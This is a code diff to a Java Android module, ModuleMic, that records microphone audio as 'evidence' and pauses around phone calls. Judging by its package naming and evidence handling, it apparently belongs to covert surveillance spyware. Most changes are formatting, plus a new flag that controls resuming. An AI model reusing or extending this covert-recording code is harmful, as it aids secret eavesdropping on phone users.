@@ -9,11 +9,6 @@
 
 package com.android.dvci.module;
 
-import java.io.IOException;
-import java.io.InputStream;
-import java.util.HashSet;
-import java.util.Set;
-
 import android.content.Context;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
@@ -46,25 +41,31 @@ import com.android.dvci.util.DateTime;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.IOException;
+import java.io.InputStream;
+import java.util.HashSet;
+import java.util.Set;
+
 /**
  * The Class MicAgent. 8000KHz, 16bit
- * 
- * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
- * 
+ *
  * @author zeno
+ * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  */
 public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
 	// #!AMR[space]
-	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
+	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	private static final int SUSPEND_CALL = 0;
 	private static StandByObserver standbyObserver;
 
-	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
+	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 
-	/** The recorder. */
+	/**
+	 * The recorder.
+	 */
 	MediaRecorder recorder;
 
 	// Object stateLock = new Object();
@@ -82,6 +83,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	private Observer<ProcessInfo> processObserver;
 
 	public Set<String> blacklist = new HashSet<String>();
+	private boolean allowResume = true;
 
 	public ModuleMic() {
 		super();
@@ -286,10 +288,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private synchronized void saveRecorderEvidence() {
 
-		if(recorder==null){
+		if (recorder == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveRecorderEvidence) Error: recorder is null");
-				
+
 			}
 			numFailures += 1;
 			return;
@@ -431,11 +433,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	/**
 	 * Start recorder.
-	 * 
-	 * @throws IllegalStateException
-	 *             the illegal state exception
-	 * @throws IOException
-	 *             Signals that an I/O exception has occurred.
+	 *
+	 * @throws IllegalStateException the illegal state exception
+	 * @throws IOException           Signals that an I/O exception has occurred.
 	 */
 	private synchronized void startRecorder() throws IllegalStateException, IOException {
 		if (Cfg.DEBUG) {
@@ -516,11 +516,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java
+
 	/**
 	 * Stop recorder.
 	 */
 	private synchronized void stopRecorder() {
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
 		}
@@ -537,7 +538,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				}
 			}
 			recorder.reset(); // You can reuse the object by going back to
-								// setAudioSource() step
+			// setAudioSource() step
 			// recorder.release(); // Now the object cannot be reused
 			getAvailable();
 			deleteSockets();
@@ -616,7 +617,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	@Override
-	public void suspend() {
+	public synchronized void suspend() {
 		if (!isSuspended()) {
 			super.suspend();
 			saveRecorderEvidence();
@@ -654,8 +655,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	@Override
-	public void resume() {
-		if (isSuspended() && canRecordMic()) {
+	public synchronized void resume() {
+		if (isSuspended() && allowResume && canRecordMic()) {
 
 			try {
 				startRecorder();
@@ -700,7 +701,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	public void stop() {
-		final ManagerModule moduleManager = ManagerModule.self();
-		moduleManager.stop(M.e("mic"));
+		//final ManagerModule moduleManager = ManagerModule.self();
+		//moduleManager.stop(M.e("mic"));
+
+		allowResume = false;
+		suspend();
+
 	}
 }
